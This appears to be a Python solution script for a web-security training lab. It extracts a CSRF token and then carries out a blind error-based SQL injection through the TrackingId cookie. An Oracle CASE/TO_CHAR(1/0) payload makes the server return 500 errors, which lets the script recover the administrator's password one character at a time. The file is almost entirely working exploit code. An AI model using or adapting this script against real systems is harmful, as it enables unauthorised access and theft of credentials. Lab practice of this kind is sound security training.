import requests
import string
from bs4 import BeautifulSoup

arr = string.ascii_lowercase + string.digits


URL = 'https://0a5e00a7038ce75e81691b6e00220002.web-security-academy.net/login'

session = requests.Session()

response = session.get(URL)
soup = BeautifulSoup(response.text, 'html.parser')
form = soup.find('form')
csrf_input = form.find('input', {'name': 'csrf'})
if csrf_input is None:
    print("[-] CSRF token not found in login page")
    exit(1)
csrf_value = csrf_input.get('value')
print(f"[+] Found CSRF token: {csrf_value}")


count = 1
password = ''
while True:
    for i in arr:
        payload = f"uPsHJBFUN3TCnN1K' || (SELECT CASE WHEN (SUBSTR(password,{count},1) = '{i}') THEN TO_CHAR(1/0) ELSE NULL END FROM users where username = 'administrator') --"
        cookies = {'TrackingId': payload}
        payload_2 = f"csrf={csrf_value}&username=a&password=a"
        response = session.post(URL, cookies=cookies, data=payload_2)
        if response.status_code == 500:
            password += i
            print(f'Passwordc found: {password}')
            break
    count += 1
    if count > 20:
        break